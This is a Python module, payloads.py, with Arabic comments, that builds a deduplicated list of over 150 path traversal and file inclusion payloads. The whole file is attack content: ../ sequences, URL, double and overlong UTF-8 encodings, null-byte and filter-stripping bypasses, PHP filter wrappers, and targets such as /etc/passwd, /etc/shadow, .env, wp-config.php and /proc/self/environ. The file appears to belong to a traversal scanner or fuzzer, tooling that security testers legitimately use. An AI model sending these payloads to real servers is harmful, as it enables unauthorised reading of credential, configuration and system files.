# ═══════════════════════════════════════════════════════
#  payloads.py — مولّد الحمولات (150+ حمولة)
#  يغطي: تسلسلات، ترميزات، null bytes، مسارات مطلقة
# ═══════════════════════════════════════════════════════

def generate_payloads():
    payloads = []
    seen = set()

    def add(p):
        if p and p not in seen:
            seen.add(p)
            payloads.append(p)

    # ─── 1) الأولوية القصوى: اجتياز المسارات القياسي (Standard Traversals) ───
    # هذه الحمولات تنجح في 90% من الثغرات الواقعية
    std_depths = [3, 4, 5, 7, 8]
    for d in std_depths:
        add("../" * d + "etc/passwd")
        add("..\\" * d + "windows\\win.ini")
        add("..\\" * d + "win.ini")
        add("../" * d + "windows/win.ini")
        add("../" * d + "etc/hosts")
        add("..\\" * d + "boot.ini")

    # ─── 2) المسارات المطلقة الأكثر شهرة (Absolute Paths) ───
    add("/etc/passwd")
    add("/etc/hosts")
    add("/etc/shadow")
    add("C:\\Windows\\win.ini")
    add("C:\\boot.ini")
    add("/.env")
    add(".env")
    add("wp-config.php")
    add("web.config")
    add("/proc/self/environ")
    add("/proc/self/cmdline")
    add("/var/www/html/.env")

    # ─── 3) مغلّفات PHP والبروتوكولات (Wrappers) ───
    add("php://filter/convert.base64-encode/resource=index.php")
    add("php://filter/convert.base64-encode/resource=index")
    add("php://filter/resource=/etc/passwd")
    add("file:///etc/passwd")
    add("file:///C:/Windows/win.ini")

    # ─── 4) ترميزات URL الشائعة (URL Encodings) ───
    for d in [3, 5, 7]:
        add("..%2f" * d + "etc/passwd")
        add("..%2f" * d + "etc%2fpasswd")
        add("..%5c" * d + "windows\\win.ini")
        add("..%5c" * d + "windows%5cwin.ini")
        add("%2e%2e/" * d + "etc/passwd")
        add("%2e%2e%2f" * d + "etc/passwd")
        add("%2e%2e%5c" * d + "windows\\win.ini")

    # ─── 5) تجاوزات الحذف والتنظيف السطحي (Filter Stripping: ....//) ───
    for d in [3, 5]:
        add("....//" * d + "etc/passwd")
        add("....\\\\" * d + "windows\\win.ini")
        add("..././" * d + "etc/passwd")
        add("..//..//..//..//etc/passwd")
        add("..\\\\..\\\\..\\\\..\\\\windows\\win.ini")

    # ─── 6) Null Byte وتجاوز الامتدادات (Null Byte & Extension Bypasses) ───
    for d in [3, 5]:
        add("../" * d + "etc/passwd%00")
        add("../" * d + "etc/passwd%00.jpg")
        add("../" * d + "etc/passwd%00.png")
        add("../" * d + "windows/win.ini%00")
        add("../" * d + "etc/passwd.jpg")
    add("/etc/passwd%00")
    add("/etc/passwd%00.jpg")

    # ─── 7) ترميزات مضاعفة ومتقدمة (Double Encodings) ───
    for d in [3, 5]:
        add("..%252f" * d + "etc/passwd")
        add("..%255c" * d + "windows\\win.ini")
        add("%252e%252e%252f" * d + "etc/passwd")

    # ─── 8) تجاوزات الترميز العريض و Overlong UTF-8 ───
    add("..%c0%af..%c0%af..%c0%afetc/passwd")
    add("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd")
    add("%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd")
    add("\uff0e\uff0e/\uff0e\uff0e/\uff0e\uff0e/etc/passwd")
    add("%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd")

    # ─── 9) مسارات إضافية ───
    add(".env.local")
    add(".env.production")
    add("application/config/database.php")
    add("../wp-config.php")
    add("..;/" * 3 + "etc/passwd")
    add("..%00/" * 3 + "etc/passwd")
    add(".%2e/" * 3 + "etc/passwd")

    return payloads


if __name__ == "__main__":
    p = generate_payloads()
    print(f"إجمالي الحمولات: {len(p)}")
